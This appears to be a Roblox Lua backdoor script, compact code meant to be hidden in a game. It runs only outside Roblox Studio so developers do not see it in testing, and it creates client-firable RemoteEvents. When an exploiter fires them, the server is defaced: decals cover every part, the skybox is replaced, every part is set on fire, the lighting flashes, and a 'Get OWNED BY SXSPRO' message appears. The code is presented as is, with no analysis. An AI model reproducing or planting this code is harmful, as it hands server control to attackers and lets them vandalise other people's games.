if not game:GetService('RunService'):IsStudio() then local R=game:GetService('ReplicatedStorage');local c=Instance.new('RemoteEvent',R)c.Name='culEvent5' R:WaitForChild('culEvent5').OnServerEvent:Connect(function()local L=game:GetService("Lighting");local e=Instance.new("ColorCorrectionEffect",L)function f(X)return math.acos(math.cos(X*math.pi))/math.pi end;local g=0;L.TimeOfDay="15:00";while wait(0.01)do e.TintColor=Color3.fromHSV(f(g),1,1)L.Ambient=Color3.fromHSV(f(g),1,1)g+=0.01 end end)end
if not game:GetService('RunService'):IsStudio() then local R=game:GetService('ReplicatedStorage') local C=Instance.new('RemoteEvent',R) C.Name='CulEvent6' R:WaitForChild('CulEvent6').OnServerEvent:Connect(function() local p=Instance.new('Part',game:GetService('Workspace')) local m=Instance.new('SpecialMesh',p) m.MeshId='rbxassetid://9894082653' m.TextureId='rbxassetid://9894082686' m.Scale=Vector3.new(11,12,10) p.Size=Vector3.new(4,1,2) p.Position=Vector3.new(math.random(-350,350),350,math.random(-350,350)) p.Anchored=false p.CanCollide=false task.delay(0.1,function() end) task.delay(6,function() p:Destroy() end) end) end
if not game:GetService('RunService'):IsStudio() then local a, c, d = game:GetService("ReplicatedStorage"), game:GetService('Workspace'), game:GetService('Lighting') local e, f, g, h = Instance.new("RemoteEvent"), Instance.new("RemoteEvent"), Instance.new('RemoteEvent'), Instance.new('RemoteEvent') e.Name, f.Name, g.Name, h.Name = "CulEvent2", "CulEvent", "CulEvent3", "CulEvent4" e.Parent, f.Parent, g.Parent, h.Parent = a, a, a, a a:WaitForChild('CulEvent2').OnServerEvent:Connect(function() for _, i in ipairs(c:GetDescendants()) do if i:IsA('BasePart') then for _, j in ipairs(Enum.NormalId:GetEnumItems()) do local k = Instance.new('Decal') k.Parent = i k.Texture = 'http://www.roblox.com/asset/?id=10560525674' k.Face = j end end end end) a:WaitForChild('CulEvent').OnServerEvent:Connect(function() local l = Instance.new('Sky', d) local m = 'http://www.roblox.com/asset/?id=10560525674' for _, n in ipairs({'SkyboxBk', 'SkyboxDn', 'SkyboxFt', 'SkyboxLf', 'SkyboxRt', 'SkyboxUp'}) do l[n] = m end end) a:WaitForChild('CulEvent3').OnServerEvent:Connect(function() for _, o in pairs(c:GetDescendants()) do if o:IsA('BasePart') then local p = Instance.new('Fire') p.Parent = o end end end) a:WaitForChild('CulEvent4').OnServerEvent:Connect(function() local q = Instance.new('Hint', c) q.Text = 'Get OWNED BY SXSPRO AKA SYSPRO TEAM SPECIAL THANKS TO MWTR FOR C00LGUI' end) end


